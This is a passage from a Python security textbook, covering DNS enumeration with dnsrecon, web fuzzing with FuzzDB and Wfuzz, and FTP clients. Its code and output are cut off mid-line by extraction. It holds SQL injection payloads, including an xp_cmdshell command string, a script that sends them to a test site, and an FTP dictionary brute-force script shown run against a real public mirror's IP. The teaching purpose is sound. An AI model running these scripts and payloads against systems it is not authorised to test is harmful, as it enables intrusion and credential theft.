$ python dnsrecon.py -d www.python.org  
[*] std: Performing General Enumeration against: www
[-] DNSSEC is not configured for www.python.org 
[*]  
 SOA ns1.fastly.net 23.235.32.32 
[*]  
 CNAME www.python.org dualstack.python.map.f
[*]  
 A dualstack.python.map.fastly.net 151.101.1
[*]  
 CNAME www.python.org dualstack.python.map.f
[*]  
 AAAA dualstack.python.map.fastly.net 2a04:4
[*] Enumerating SRV Records 
[-] No SRV Records Found for www.python.org 
$ python dnsrecon.py -d www.python.com -t zonewalk  
[*] Performing NSEC Zone Walk for www.python.com 
[*] Getting SOA record for www.python.com 
[-] This zone appears to be misconfigured, no SOA re
[*]  
 A www.python.com 3.96.23.237 
[+] 1 records found 

Having obtained the name servers, a brute force enumeration could
be performed. Among the main options, we can highlight:
The -n option deﬁnes the domain server to use.
The -D option deﬁnes the subdomain or hostname dictionary
ﬁle to use for brute force.
The -t brt option speciﬁes the type of enumeration to perform
– brt is for brute forcing domains and hosts using a deﬁned
dictionary:
In the following command, we use the zonetransfer.me domain
whose name servers allow successful zone transfers:
$ dnsrecon -d <domain> -n <dns> -D <dictionary> -t b
$ python dnsrecon.py -d zonetransfer.me -t axfr  
[*] Checking for Zone Transfer for zonetransfer.me n
[*] Resolving SOA Record 
[+]  
 SOA nsztm1.digi.ninja 81.4.108.41 
[*] Resolving NS Records 
[*] NS Servers found: 
[+]  
 NS nsztm1.digi.ninja 81.4.108.41 
[+]  
 NS nsztm2.digi.ninja 34.225.33.2 
[*] Removing any duplicate NS server IP Addresses..
[*]   
[*] Trying NS server 34.225.33.2 
[+] 34.225.33.2 Has port 53 TCP Open 
[+] Zone Transfer was successful!! 

This script also makes use of search engine dorks to get subdomains:
bing: Perform Bing search for subdomains and hosts.
yand: Perform Yandex search for subdomains and hosts.
crt: Perform crt.sh search for subdomains and hosts:
$ dnsrecon -d <domain> -t bing 
$ dnsrecon -d <domain> -t yand 
$ dnsrecon -d <domain> -t crt 
Now that you know the basics about how to obtain information
about DNS records from a speciﬁc domain, let’s move on to learning
how to obtain URLs and addresses vulnerable to aĴackers in web
applications through a fuzzing process.
Getting vulnerable addresses in
servers with fuzzing
In this section, we will learn about the fuzzing process and how we
can use this practice with Python projects to obtain URLs and
addresses vulnerable to aĴackers.
The fuzzing process
A fuzzer is a program where we have a ﬁle that contains predicted
URLs for a speciﬁc application or server. Basically, we make a
request for each predicted URL and if we see that the response is
successful, it means that we have found a URL that is not public or is
hidden, but later we will see if we can access it.

Like most exploitable conditions, the fuzzing process is only useful
against systems that improperly sanitize input or that take more
data than they can handle. In general, the fuzzing process consists of
the following phases:
1. Identifying the target: To fuzz an application, we must identify
the target application.
2. Identifying inputs: The vulnerability exists because the target
application accepts a malformed input and processes it without
sanitizing it.
3. Creating fuzz data: After geĴing all the input parameters, we
must create invalid input data to send to the target application.
4. Fuzzing: After creating the fuzz data, we must send it to the
target application. We can use the fuzz data for monitoring
exceptions when calling services.
5. Determining exploitability: After fuzzing, we must check the
input that has unexpected behavior or returned a stack trace.
Web fuzzing
Web fuzzing is a technique used to ﬁnd common web vulnerabilities,
such as injection vulnerabilities, XSS, admin panel searches, etc.
This technique consists of sending random data to the URL to which
we are carrying out the aĴack. For example, a web page whose URL
is testphp.vulnweb.com. As we navigate through the page, we
realize that we visit diﬀerent paths within the URL, such as:
http://testphp.vulnweb.com/index.php
http://testphp.vulnweb.com/login.php

One of the ways we have to ﬁnd the administration panel is to try
randomly:
http://testphp.vulnweb.com/panel
http://testphp.vulnweb.com/admin
http://testphp.vulnweb.com/paneladmin
You can try the previous links until you ﬁnd an HTTP 200 OK
response code. Testing each of the possible combinations by hand is
a totally unfeasible option. But automating this process with
combinations, and ﬁles and folders that are left conﬁgured by
default, already seems a bit more feasible. Web fuzzing consists
precisely of that automation.
A web fuzzer is a type of tool that allows you to test which routes
are active and which are not on a website. The way it does this is by
testing random URLs and sending them signals to see if they work.
Therefore, in an audit process, it is key to identify which URL
addresses are active and what their content is. The way in which a
web fuzzer identiﬁes these routes is by testing random routes in an
automated way.
In the case of web applications, it is possible to fuzz POST and GET
parameters, headers, and cookies. One of the main objectives of
fuzzing is to look for anomalous behavior. This behavior can
manifest itself in several ways:
Web server response errors
Changes in response length
Errors in application logic
Response header changes

Increased response time
Understanding and using the FuzzDB
project
FuzzDB is a project where we ﬁnd a set of folders that contain
paĴerns of known aĴacks that have been collected in multiple
pentesting tests, mainly in web environments:
https://github.com/fuzzdb-project/fuzzdb
The FuzzDB categories are separated into diﬀerent directories that
contain predictable resource-location paĴerns, that is, paĴerns that
detect vulnerabilities with malicious payloads or vulnerable routes:

Figure 6.13: The FuzzDB project on GitHub
This project provides resources for testing vulnerabilities in servers
and web applications. One of the things we can do with this project
is to use it to assist in the identiﬁcation of vulnerabilities in web
applications through brute force methods. One of the objectives of
the project is to facilitate the testing of web applications. The project
provides ﬁles for testing speciﬁc use cases against web applications.
We could build our own fuzzer in order to identify predictable URLs
using the FuzzDB project. MyFuzzer is a script for pentesting to
gather information about the targets based on the FuzzDB project.
You can ﬁnd the following code in the MyFuzzer.py ﬁle inside the
myFuzzer folder:
import re 
import requests  
import sys 
import os 
import argparse 
import time 
import optparse 
def main(): 
    pars = optparse.OptionParser(description="[*] Di
    pars.add_option('-u', '--url',action="store", de
    pars.add_option('-w', '--wordlist',action="store
    opts, args = pars.parse_args() 
    if not opts.url: 
        print("usage : python myFuzzer.py -h") 
    if opts.wordlist: 
        if not os.path.isfile(str(opts.wordlist)): 

            print("[!] Please checkout your Custom w
            sys.exit(0) 
    fuzz(opts.url,opts.wordlist) 
def ok_results(results): 
    print("200 Ok results") 
    print("---------------") 
    for result in results: 
        print("[+] -[200] -"+result) 
def fuzz(url,CustomWordlist): 
    results = [] 
    if CustomWordlist : 
        words = [w.strip() for w in open(str(CustomW
    else : 
        words = [w.strip() for w in open(wordlists["
    try: 
        if not url.startswith('http://'): 
            url ="http://"+url 
        for paths in words: 
            paths = paths.decode() 
            if not paths.startswith('/'): 
                paths ="/"+paths 
            fullPath = url+paths 
            print(fullPath) 
            response = requests.get(fullPath) 
            code = str(response.status_code) 
            print("[+] [{time}] - [{code}] - [{paths
            if code == "200": 
                results.append(fullPath) 
        ok_results(results) 
    except Exception as e: 
        print("ERROR =>",e) 
if __name__ == '__main__': 

When executing the previous script, we can start a fuzzing process
using a custom wordlist:
In the output of the above command, we see those URLs that have
returned a 200 OK response code for the domain we are analyzing.
Identifying predictable login pages with the
FuzzDB project
We could build a script that, given a URL we are analyzing, allows
us to test the connection for each of the login routes, and if the
request returns a 200 code, then it means the login page has been
found on the server.
Using the following script, we can obtain predictable URLs such as
login, admin, and administrator. For each combination of domain +
predictable URL, we are verifying the status code returned. You
    try: 
        main() 
    except KeyboardInterrupt as err: 
        sys.exit(0) 
$ python myFuzzer.py -u testasp.vulnweb.com -w fuzzd
200 Ok results 
--------------- 
[+] -[200] -http://testasp.vulnweb.com/login.asp 
[+] -[200] -http://testasp.vulnweb.com/login.asp 
[+] -[200] -http://testasp.vulnweb.com/logout.asp 

can ﬁnd the following code in the fuzzdb_login_page.py ﬁle
inside the fuzzdb folder:
import requests 
logins = [] 
with open('Logins.txt', 'r') as filehandle: 
    for line in filehandle: 
        login = line[:-1] 
        logins.append(login) 
domain = "http://testphp.vulnweb.com"
for login in logins: 
    print("Checking... "+ domain + login) 
    response = requests.get(domain + login) 
    if response.status_code == 200: 
        print("Login resource detected: " +login) 
In the previous script, we used the Logins.txt ﬁle located in the
following GitHub repository:
https://github.com/fuzzdb-
project/fuzzdb/blob/master/discovery/predictable-
filepaths/login-file-locations/Logins.txt
This could be the output of the previous script where we can see
how the admin page resource has been detected over the root folder
in the http://testphp.vulnweb.com domain:
$ python fuzzdb_login_page.py 
Checking... http://testphp.vulnweb.com/admin 
Login Resource detected: /admin 

Checking... http://testphp.vulnweb.com/Admin 
Checking... http://testphp.vulnweb.com/admin.asp 
Checking... http://testphp.vulnweb.com/admin.aspx 
... 
We can see that, for each string located in the ﬁle, it has the capacity
to test the presence of a speciﬁc login page in the domain we are
analyzing.
Discovering SQL injection with the FuzzDB
project
In the same way as we analyzed before, we could build a script
where, given a website that we are analyzing, we could test it for
discovering SQL injection using a ﬁle that provides a list of strings
we can use for testing this kind of vulnerability.
In the GitHub repository of the project, we can see some ﬁles depend
on the SQL aĴack and the database type we are testing:

Figure 6.14: Files for testing injection in databases
For example, we can ﬁnd a speciﬁc ﬁle for testing SQL injection in
MySQL databases:
https://github.com/fuzzdb-
project/fuzzdb/blob/master/attack/sql-
injection/detect/MSSQL.txt
In the MSSQL.txt ﬁle we can ﬁnd in the previous repository, we can
see all available aĴack vectors to discover a SQL injection
vulnerability:
; -- 
'; -- 
'); -- 
'; exec master..xp_cmdshell 'ping 10.10.1.2'-- 

The GitHub repository of the project,
https://github.com/fuzzdb-
project/fuzzdb/tree/master/attack/sql-
injection/detect, contains many ﬁles for detecting
variants of SQL injection. For example, we can ﬁnd the
GenericBlind.txt ﬁle, which contains other strings
related to SQL injection that you can test in many web
applications that support other databases.
You can ﬁnd the following code in the fuzzdb_sql_injection.py
ﬁle inside the fuzzdb folder:
' grant connect to name; grant resource to name; -- 
' or 1=1 -- 
' union (select @@version) -- 
' union (select NULL, (select @@version)) -- 
' union (select NULL, NULL, (select @@version)) -- 
' union (select NULL, NULL, NULL,  (select @@version
' union (select NULL, NULL, NULL, NULL,  (select @@v
' union (select NULL, NULL, NULL, NULL,  NULL, (sele
import requests 
domain = "http://testphp.vulnweb.com/listproducts.ph
mysql_attacks = [] 
with open('MSSQL.txt', 'r') as filehandle: 
    for line in filehandle: 
        attack = line[:-1] 
        mysql_attacks.append(attack) 

This could be the output of the previous script where we can see
how the listproducts.php page is vulnerable to many SQL
injection aĴacks:
We can see that, for each string aĴack located in the MSSQL.txt ﬁle,
it has the capacity to test the presence of SQL injection in the domain
we are analyzing. Using the fuzzdb project provides resources for
testing vulnerabilities in servers and web applications.
Wfuzz
for attack in mysql_attacks: 
    print("Testing... "+ domain + attack) 
    response = requests.get(domain + attack) 
    if "mysql" in response.text.lower(): 
        print("Injectable MySQL detected") 
        print("Attack string: "+attack) 
$ python fuzzdb_sql_injection.py 
Testing... http://testphp.vulnweb.com/listproducts.p
Injectable MySQL detected 
Attack string: ; -- 
Testing... http://testphp.vulnweb.com/listproducts.p
Injectable MySQL detected 
Attack string: '; -- 
Testing... http://testphp.vulnweb.com/listproducts.p
Injectable MySQL detected 
... 

Wfuzz (https://pypi.org/project/wfuzz) is a tool that can be
installed like any other Python package with the following
command:
$ pip install wfuzz 
Its basic use is reduced to the following parameters:
Usage:  wfuzz [options] -z payload,params <url> 
The most used parameters of the tool are:
c: Shows with diﬀerent colors the diﬀerent HTTP code received
by the server.
R depth: If we want to add recursion in our directory search,
with this parameter we can deﬁne the level, for example -R 1
hc xxx: Where xxx is an HTTP code. With this parameter, we
indicate that it does not show all those outputs with error code
xxx.
hs regex: Do not show responses that contain a string that
matches the regex.
ss regex: Show only those responses that contain a string that
matches the regex.
With the following command, we would be testing all the words
contained in the PHP.txt ﬁle, substituting them in the place of the
URL where the word FUZZ appears. With the parameter –hc 404,
we would be discarding all the responses from the server that come
with HTTP 404 code:

In the execution of the previous command, we see that we have
made 30 requests in 0.76 seconds and we have found 1 PHP ﬁle
called login.php.
Summary
In this chapter, we learned about the diﬀerent modules that allow us
to extract information that servers expose publicly. We began by
discussing the main OSINT tools used to extract information from
servers and looked at details of speciﬁc tools like SpiderFoot. This
was followed by the dnspython module, which we used to extract
DNS records from a speciﬁc domain. Finally, we learned about the
fuzzing process and used the FuzzDB project to test vulnerabilities
in servers.
$ wfuzz -c -z file,/chapter6/myFuzzer/fuzzdb/discove
****************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                      
****************************************************
Target: http://testphp.vulnweb.com/FUZZ 
Total requests: 30  
====================================================
ID           Response   Lines    Word       Chars   
====================================================
000000023:   200        119 L    432 W      5523 Ch 
Total time: 0.765058 
Processed Requests: 30 
Filtered Requests: 29 
Requests/sec.: 39.21267 

The tools we have discussed, and the information you extracted
from servers, will be useful for later phases of our pentesting or
audit process.
In the next chapter, we will explore the Python programming
packages that interact with the FTP, SSH, and SNMP servers.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which third-party platforms can be conﬁgured in SpiderFoot to
extract information from external services?
2. Which technique can be used to obtain the predictable URLs
from a domain?
3. Which method should be called and what parameters should be
passed to obtain the records for name servers with the
DNSPython module?
4. Which project contains ﬁles and folders that contain paĴerns of
known aĴacks that have been collected in various pentesting
tests on web applications?
5. Which module can be used to detect SQL injection-type
vulnerabilities with the FuzzDB project?
Further reading
At the following links, you can ﬁnd more information about
mentioned tools and other tools related to extracting information

from web servers:
Python DNS module: http://www.dnspython.org
FuzzDB project: https://github.com/fuzzdb-
project/fuzzdb
Wfuzz: https://github.com/xmendez/wfuzz is a web-
application security-fuzzer tool that you can use from the
command line or programmatically.
Dirhunt: https://github.com/Nekmo/dirhunt is a web
crawler optimized for searching and analyzing directories on a
website—we can use this tool to ﬁnd web directories without
following a brute-force process.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

7
Interacting with FTP, SFTP, and
SSH Servers
In this chapter, we will learn about the modules that allow us to
interact with FTP, SFTP, and SSH servers. These modules will make
it easier to connect to diﬀerent types of servers while performing
tests related to the security of the services that are running on these
servers.
As a part of this chapter, we will explore how the computers in a
network can interact with each other and how they can access a few
services through Python scripts and modules such as ftplib,
paramiko, and pysftp. Finally, we are going to check the security of
SSH servers with the ssh-audit and Rebex SSH check tools.
The following topics will be covered in this chapter:
Connecting to FTP servers
Building an anonymous FTP scanner with Python
Connecting to SSH and SFTP servers using the paramiko and
pysftp modules
Implementing SSH servers with the paramiko module
Checking the security of SSH servers with the ssh-audit and
Rebex SSH check tools

Technical requirements
To get the most out of this chapter, you will need to install a Python
distribution on your local machine and have some basic knowledge
about the HTTP protocol. We will work with Python version 3.10,
available at https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter07.
Connecting to FTP servers
So, let’s begin. In this ﬁrst section, you’ll learn about the FTP
protocol and how to use ftplib to connect with FTP servers,
transferring ﬁles and implementing a brute-force process to get FTP
user credentials.
FTP protocol
FTP is a cleartext protocol that’s used to transfer data from one
system to another and uses Transmission Control Protocol (TCP)
on port 21, which allows the exchange of ﬁles between client and
server. FTP is a very common protocol for ﬁle transfer and is mostly
used by people to transfer a ﬁle from local workstations to remote
servers.

The protocol is designed in such a way that the client and server
need not use the same operating system to transfer ﬁles between
them. This means any client and any FTP server may use a diﬀerent
operating system to move ﬁles using the operations and commands
described in the protocol.
The protocol is focused on oﬀering clients and servers an acceptable
speed in the transfer of ﬁles, but it does not consider more important
concepts such as security. The disadvantage of this protocol is that
the information travels in plaintext, including access credentials
when a client authenticates on the server.
Now that we have learned about the FTP protocol, let’s understand
how we can connect to it using the Python ftplib module.
Using the Python ftplib module
ftplib is a native Python module that allows connecting with FTP
servers and executing commands on these servers. It is designed to
create FTP clients with a few lines of code and to perform admin
server tasks. To know more about the ftplib module, you can
review the oﬃcial documentation:
https://docs.python.org/3.10/library/ftplib.html.
One of the main features this module oﬀers is ﬁle transfer between a
client and server. Let’s understand how this transfer takes place.
Transferring files with FTP
ftplib can be used for transferring ﬁles to and from remote
machines. The constructor method of the FTP class is deﬁned in the

__init__() method , which accepts the host, user, and the
password as parameters to connect with the server.
We can connect with an FTP server in several ways. The ﬁrst one is
by using the connect() method using the following arguments:
The second one is through the FTP class constructor. The FTP()
class takes three parameters: the remote server, the username, and
the password of that user. In the following example, we are
connecting to an FTP server to download a binary ﬁle from the
ftp.be.debian.org server. In the following script, we can see how
to connect with an anonymous FTP server and download binary ﬁles
with no username and password.
You can ﬁnd the following code in the ftp_download_file.py ﬁle,
located in the ftplib folder on the GitHub repository:
     |  connect(self, host='', port=0, timeout=-999,
     |      Connect to host.  Arguments are: 
     |      - host: hostname to connect to (string, 
     |      - port: port to connect to (integer, def
     |      - timeout: the timeout to set against th
     |      - source_address: a 2-tuple (host, port)
     |        to as its source address before connec
#!/usr/bin/env python3
import ftplib 
FTP_SERVER_URL = 'ftp.be.debian.org' 
DOWNLOAD_DIR_PATH = 'www.kernel.org/pub/linux/kernel

In the previous code, we are opening an ftp connection with the
FTP constructor, passing server and username as parameters.
Using the dir() method, we are listing the ﬁles in the directory
speciﬁed in the DOWNLOAD_DIR_PATH constant. Finally, we are using
the retrbinary() method to download the ﬁle speciﬁed in the
DOWNLOAD_FILE_NAME constant.
Another way to download a ﬁle from the FTP server is using the
retrlines() method, which accepts the ftp command to execute
as a parameter. For example, LIST is a command deﬁned by the
protocol, as well as others that can also be applied in this function
such as RETR, NLST, or MLSD. You can obtain more information
about the supported commands in the RFC 959 document, at
https://www.rfc-editor.org/rfc/rfc959.html.
DOWNLOAD_FILE_NAME = 'ChangeLog-6.0'
def ftp_file_download(server, username): 
    ftp_client = ftplib.FTP(server, username) 
    ftp_client.cwd(DOWNLOAD_DIR_PATH) 
    try: 
        with open(DOWNLOAD_FILE_NAME, 'wb') as file_
            ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME 
            ftp_client.retrbinary(ftp_cmd,file_handl
            ftp_client.quit() 
    except Exception as exception: 
        print('File could not be downloaded:',except
if __name__ == '__main__': 
    ftp_file_download(server=FTP_SERVER_URL,username

The second parameter of the retrlines() method is a callback
function, which is called for each line of received data. You can ﬁnd
the following code in the get_ftp_file.py ﬁle, located in the
ftplib folder in the GitHub repository:
In the previous code, we are connecting to the FTP server at
ftp.be.debian.org, changing to the directory
/www.kernel.org/pub/linux/kernel/v6.x/ with the cwd()
method, and downloading a speciﬁc ﬁle on that server. To download
the ﬁle, we use the retrlines() method. We need to pass the RETR
command with the ﬁlename as an input parameter and a callback
function called writeData(), which will be executed every time a
block of data is received.
In a similar way to what we have implemented before, in the
following example, we are using the ntransfercmd() method from
the ftp_client instance to apply a RETR command to receive ﬁle
data in a byte array. You can ﬁnd the following code in the
from ftplib import FTP 
def writeData(data): 
    file_descryptor.write(data+"\n") 
ftp_client=FTP('ftp.be.debian.org') 
ftp_client.login() 
ftp_client.cwd('/www.kernel.org/pub/linux/kernel/v6
file_descryptor=open('ChangeLog-6.0','wt') 
ftp_client.retrlines('RETR ChangeLog-6.0',writeData)
file_descryptor.close() 
ftp_client.quit() 

ftp_download_file_bytes.py ﬁle located in the ftplib folder in
the GitHub repository:
In the previous code, we are executing the RETR command to
download the ﬁle using a loop that controls the data received in the
buffer variable.
The execution of the previous script gives us the following output:
from ftplib import FTP 
ftp_client=FTP('ftp.be.debian.org') 
ftp_client.login() 
ftp_client.cwd('/www.kernel.org/pub/linux/kernel/v6
ftp_client.voidcmd("TYPE I") 
datasock,estsize=ftp_client.ntransfercmd("RETR Chang
transbytes=0
with open('ChangeLog-6.0','wb') as file_descryptor: 
    while True: 
        buffer=datasock.recv(2048) 
        if not len(buffer): 
            break 
        file_descryptor.write(buffer) 
        transbytes +=len(buffer) 
        print("Bytes received",transbytes,"Total",(e
datasock.close() 
ftp_client.quit() 
$ python ftp_download_file_bytes.py 
Bytes received 1400 Total (14871435, 0.0094140209065
Bytes received 2800 Total (14871435, 0.0188280418130

As you have seen, we have several ways to download a ﬁle. In the
ftp_download_file.py script, we are using the retrbinary()
method for downloading a ﬁle, and in the previous script, we are
working with sockets and bytes and we require more knowledge at a
low level. Moving on, let’s understand some other functions that the
ftplib module has to oﬀer.
Other ftplib functions
ftplib provides other functions we can use to execute FTP
operations, some of which are as follows:
FTP.getwelcome(): Gets the welcome message
FTP.pwd(): Returns the current directory
FTP.cwd(path): Changes the working directory
FTP.dir(path): Returns a list of directories
FTP.nlst(path): Returns a list with the ﬁlenames of the directory
FTP.size(ﬁle): Returns the size of the ﬁle we pass as a parameter
Let’s focus on the FTP.dir(path) and FTP.nlst(path) methods.
In the following example, we are going to list ﬁles available in the
Linux kernel FTP server using the dir() and nlst() methods. You
can ﬁnd the following code in the ftp_listing_files.py ﬁle
located in the ftplib folder in the GitHub repository:
Bytes received 4848 Total (14871435, 0.0325994095391
Bytes received 6896 Total (14871435, 0.0463707772652
... 
Bytes received 14870048 Total (14871435, 99.99067339
Bytes received 14871435 Total (14871435, 100.0) % 

In the previous code, we are using the getwelcome() method to get
information about the FTP version. With the dir() method, we are
listing ﬁles and directories in the root directory and with the nlst()
method, we are listing versions available in the Linux kernel.
The execution of the previous script gives us the following output:
from ftplib import FTP 
ftp_client=FTP('ftp.be.debian.org') 
print("Server: ",ftp_client.getwelcome()) 
print(ftp_client.login()) 
print("Files and directories in the root directory:"
ftp_client.dir() 
ftp_client.cwd('/www.kernel.org/pub/linux/kernel/v6
files=ftp_client.nlst() 
files.sort() 
print("%d files in /pub/linux/kernel directory:"%len
for file in files: 
    print(file) 
ftp_client.quit() 
$ python ftp_listing_files.py 
Server:  220 ProFTPD Server (mirror.as35701.net) [:
230-Welcome to mirror.as35701.net. 
230-The server is located in Brussels, Belgium. 
230-Server connected with gigabit ethernet to the in
230-The server maintains software archive accessible
230-ftp.be.debian.org is an alias for this host, but
230-alias. If you want to use https use mirror.as357
230-Contact: kurt@roeckx.be 

We can see how we are obtaining the FTP server version, the list of
ﬁles available in the root directory, and the number of ﬁles available
in the /pub/linux/kernel path. This information could be very
useful when auditing and testing a server.
Using ftplib to brute-force FTP user
credentials
The ftplib module can also be used to create scripts that automate
certain tasks or perform dictionary aĴacks against an FTP server.
The term “dictionary aĴack” refers to a hacking technique that
allows you to test the security of systems and applications protected
by a username and password.
One of the main use cases we can implement is checking whether an
FTP server is vulnerable to a brute-force aĴack using a dictionary.
For example, with the following script, we can execute an aĴack
using a dictionary of users and passwords against an FTP server.
You can ﬁnd the following code in the
ftp_brute_force_multiprocessing.py ﬁle located in the ftp
230 Anonymous access granted, restrictions apply 
Files and directories in the root directory: 
lrwxrwxrwx   1 ftp      ftp            16 May 14  20
drwxr-xr-x   9 ftp      ftp          4096 Jul  7 14
…. 
113 files in /pub/linux/kernel directory: 
…. 

brute force directory folder within ftplib folder in the GitHub
repository:
import ftplib 
import multiprocessing 
def brute_force(ip_address,user,password): 
    ftp = ftplib.FTP(ip_address) 
    try: 
        print("Testing user {}, password {}".format(
        response = ftp.login(user,password) 
        if "230" in response and "access granted" in
            print("[*]Successful brute force") 
            print("User: "+ user + " Password: "+pas
        else: 
            pass 
    except Exception as exception: 
        print('Connection error', exception) 
def main(): 
    ip_address = input("Enter IP address or host nam
    with open('users.txt','r') as users: 
        users = users.readlines() 
    with open('passwords.txt','r') as passwords: 
        passwords = passwords.readlines() 
    for user in users: 
        for password in passwords: 
            process = multiprocessing.Process(target
            args=(ip_address,user.rstrip(),password
            process.start() 
if __name__ == '__main__': 
    main() 

In the previous code, we are using the multiprocessing module to
execute the brute_force() method through the creation of a
process instance for each combination of username/password.
Here we are using the brute_force() function to check each
username and password combination we are reading from two text
ﬁles called users.txt and passwords.txt. In the following
output, we can see the execution of the previous script. We could test
it using the IP address from the previous tested FTP domain
ftp.be.debian.org. Remember that running this script on an IP
address over which we have no control could pose an additional
risk:
$ python ftp_brute_force_multiprocessing.py  
Enter IP address or host name:195.234.45.114 
Testing user user1, password password1 
Connection error 530 Login incorrect. 
Testing user user1, password password2 
Connection error 530 Login incorrect. 
Testing user user1, password anonymous 
Connection error 530 Login incorrect. 
Testing user user2, password password1 
Connection error 530 Login incorrect. 
Testing user user2, password password2 
Connection error 530 Login incorrect. 
Testing user user2, password anonymous 
Connection error 530 Login incorrect. 
Testing user anonymous, password password1 
[*]Successful brute force 
User: anonymous Password: anonymous 

In the previous output, we can see how we are testing all possible
username and password combinations until we ﬁnd the right one.
We will know that the combination is a good one if, when trying to
connect, we obtain the response code 230 and the string "access
granted".
Thus, by using this dictionary method, we can ﬁnd out whether our
FTP server is vulnerable to a brute-force aĴack, and thus beef up
security if any vulnerability is found. Let’s now move on to our next
section, where we will build an anonymous FTP scanner with
Python.
Building an anonymous FTP
scanner with Python
We can use the ftplib module for building a script to determine
whether a server oﬀers anonymous logins. This mechanism consists
of supplying the FTP server with the word anonymous as the name
and password of the user. In this way, we can make queries to the
FTP server without knowing the data of a speciﬁc user. You can ﬁnd
the following code in the checkFTPanonymousLogin.py ﬁle, located
in the ftplib folder in the GitHub repository:
import ftplib 
def anonymousLogin(hostname): 
    try: 
        ftp = ftplib.FTP(hostname) 
        response = ftp.login('anonymous', 'anonymous
        print(response) 

In the previous code, the anonymousLogin() function takes a
hostname as a parameter and checks the connection with the FTP
server with an anonymous user. The function tries to create an FTP
connection with anonymous credentials, and it shows information
related to the server and the list of ﬁles in the root directory.
In a similar way, we could implement a function for checking
anonymous user login using only the FTP class constructor and the
context manager approach. You can ﬁnd the following code in the
ftp_list_server_anonymous.py ﬁle, located in the ftplib folder
in the GitHub repository:
        if "230 Anonymous access granted" in respons
            print('\n[*] ' + str(hostname) +' FTP An
            print(ftp.getwelcome()) 
            ftp.dir() 
    except Exception as exception: 
        print(str(exception)) 
        print('\n[-] ' + str(hostname) +' FTP Anonym
hostname = 'ftp.be.debian.org' 
anonymousLogin(hostname) 
import ftplib 
FTP_SERVER_URL = 'ftp.be.debian.org' 
DOWNLOAD_DIR_PATH = '/www.kernel.org/pub/linux/kerne
def check_anonymous_connection(host, path): 
    with ftplib.FTP(host, user="anonymous") as conne
        print( "Welcome to ftp server ", connection
        for name, details in connection.mlsd(path): 
            print( name, details['type'], details.ge

Here, we are using the constants deﬁned in FTP_SERVER_URL and
DOWNLOAD_DIR_PATH to test the anonymous connection with this
server. If the connection is successful, then we obtain the welcome
message and ﬁles located in this path. The following could be a
partial output for the execution of the previous script:
We may use anonymous access to obtain information about
accessible directories and pages that we can ﬁnd on the FTP server.
In the following example, we use the anonymous user to access the
FTP server, get the directory listing, and get the default page. You
can ﬁnd the following code in the
ftp_anonymous_directory_list.py ﬁle, located in the ftplib
folder in the GitHub repository:
if __name__ == '__main__': 
    check_anonymous_connection(FTP_SERVER_URL,DOWNLO
$ python ftp_list_server_anonymous.py 
Welcome to ftp server  220 ProFTPD Server (mirror.as
linux-6.0.13.tar.sign file 989 
linux-6.0.9.tar.xz file 133911648 
linux-6.0.7.tar.gz file 214112261 
linux-6.0.8.tar.sign file 987 
... 
import ftplib 
def return_default(ftp): 
    try: 

The execution of the previous script gives us the following output:
In this section, we have reviewed the ftplib module of the Python
standard library, which provides us with the necessary methods to
        dir_list = ftp.nlst() 
        print(dir_list) 
    except Exception as e: 
        print(f'[-] Could not list directory content
              f'[-] Skipping To Next Target.\n' 
              f'[-] Exception: {e}') 
        return 
    ret_list = [] 
    for file in dir_list: 
        fn = file.lower() 
        if '.php' in fn or '.htm' in fn or '.asp' in
            print(f'[+] Found default page: {file}')
        ret_list.append(file) 
    return ret_list 
if __name__ == "__main__": 
    tgt_host = 'ftp.be.debian.org' 
    username = 'anonymous' 
    password = 'anonymous' 
    ftp_conn = ftplib.FTP(tgt_host) 
    ftp_conn.login(username, password) 
$ python ftp_anonymous_directory_list.py 
['ubuntu-cloudimages', 'debian', 'mint-iso', 'debian
[+] Found default page: HEADER.html 

create FTP clients quickly and easily.
Now that you know the basics of transferring ﬁles and geĴing
information from FTP servers, let’s move on to learning about how
to connect with SSH servers with the paramiko module.
Connecting with SSH servers with
paramiko and pysftp
In this section, we will review the SSH protocol and the paramiko
module, which provide us with the necessary methods to create SSH
clients in an easy way.
The SSH protocol is one of the most used today because it uses
symmetric and asymmetric cryptography to provide conﬁdentiality,
authentication, and integrity to the transmiĴed data. The
communication security is enhanced between the client and server
thanks to encryption and the use of public and private keys. SSH has
become a very popular network protocol for performing secure data
communication between two computers. Both parties in
communication use SSH key pairs to encrypt their communications.
Each key pair has one private and one public key. The public key can
be published to anyone who may be interested, and the private key
is always kept private and secure from everyone except the key
owner. Public and private SSH keys can be generated and digitally
signed by a Certiﬁcation Authority (CA). These keys can also be
generated from the command line with tools such as ssh-keygen.
When the SSH client connects to a server, it registers the server’s

public key in a special ﬁle that is stored in a hidden way and is
called a /.ssh/known_hosts ﬁle.
Executing an SSH server on Debian
Linux
If you are running a distribution based on Debian Linux, you can
install the openssh package with the following command:
$ apt-get install openssh-server 
With the following commands, we can start and check the SSH
server status:
$ sudo systemctl start ssh 
$ sudo systemctl status ssh 
sshd.service - OpenSSH Daemon 
     Loaded: loaded (/usr/lib/systemd/system/sshd.se
     Active: active (running) since Thu 2023-01-05 2
   Main PID: 65319 (sshd) 
      Tasks: 1 (limit: 9349) 
     Memory: 2.0M 
        CPU: 75ms 
     CGroup: /system.slice/sshd.service 
             └─65319 "sshd: /usr/bin/sshd -D [listen
de gen. 05 23:12:06 linux-hpelitebook8470p systemd[1
de gen. 05 23:12:06 linux-hpelitebook8470p sshd[6531
de gen. 05 23:12:06 linux-hpelitebook8470p sshd[6531

In the previous output, we can see the SSH server has been started
on localhost at port 22. Now that our SSH server is started, let’s
learn about the paramiko module, which will provide us with the
necessary methods to create SSH clients in an easy way.
If we are using other Linux distributions, we can
follow instructions we can ﬁnd in the repository:
https://github.com/openssh/openssh-portable.
If we are working with Windows systems, we can use
the following repository for downloading and
installing binaries:
https://github.com/PowerShell/Win32-
OpenSSH/releases.
Introducing the paramiko module
paramiko is a module wriĴen in Python that supports the SSHV1
and SSHV2 protocols, allowing the creation of clients and making
connections to SSH servers. Since SSH1 is insecure, its use is not
recommended due to diﬀerent vulnerabilities having been
discovered, and today, SSH2 is the recommended version since it
oﬀers support for new encryption algorithms.
